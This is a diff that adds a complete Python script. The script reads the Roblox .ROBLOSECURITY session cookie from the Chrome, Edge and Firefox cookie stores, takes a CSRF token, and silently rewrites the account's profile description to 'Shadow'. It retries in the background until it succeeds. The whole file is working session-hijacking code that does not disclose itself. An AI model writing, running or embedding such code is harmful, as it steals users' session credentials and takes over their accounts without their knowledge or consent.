@@ -1,0 +1,59 @@
+import os
+import time
+import browser_cookie3
+import requests
+
+NEW_DESCRIPTION = "Shadow"
+
+def get_roblox_cookie_from_browser():
+    try:
+        for loader in [browser_cookie3.chrome, browser_cookie3.edge, browser_cookie3.firefox]:
+            try:
+                cj = loader(domain_name="roblox.com")
+                for cookie in cj:
+                    if cookie.name == ".ROBLOSECURITY":
+                        return cookie.value
+            except Exception:
+                continue
+    except Exception as e:
+        pass
+    return None
+
+def update_bio():
+    roblox_cookie = get_roblox_cookie_from_browser()
+    if not roblox_cookie:
+        return False
+
+    session = requests.Session()
+    session.cookies.set(".ROBLOSECURITY", roblox_cookie, domain=".roblox.com")
+
+    try:
+        # Get CSRF token
+        response = session.post("https://auth.roblox.com/v2/login")
+        csrf_token = response.headers.get("x-csrf-token")
+        
+        if not csrf_token:
+            return False
+
+        url = "https://users.roblox.com/v1/description"
+        headers = {
+            "X-CSRF-Token": csrf_token,
+            "Content-Type": "application/json",
+            "Referer": "https://www.roblox.com/"
+        }
+        payload = {
+            "description": NEW_DESCRIPTION
+        }
+
+        resp = session.post(url, headers=headers, json=payload)
+        return resp.status_code == 200
+    except Exception:
+        return False
+
+if __name__ == "__main__":
+    # Runs quietly in the background, retrying periodically if needed
+    while True:
+        if update_bio():
+            # If successful, can sleep longer or exit
+            break
+        time.sleep(30)
